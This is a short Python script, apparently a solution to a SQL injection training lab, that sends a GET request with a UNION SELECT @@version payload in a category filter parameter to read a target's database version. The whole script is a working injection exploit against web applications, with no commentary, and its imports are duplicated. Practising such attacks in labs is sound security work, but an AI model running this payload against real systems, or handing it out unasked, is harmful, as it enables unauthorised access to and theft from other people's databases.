import requests
import sys

import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)


burp_url = sys.argv[1]+"/filter?category=' UNION SELECT @@version, NULL -- -"
burp_headers = {}
requests.get(burp_url, headers=burp_headers)
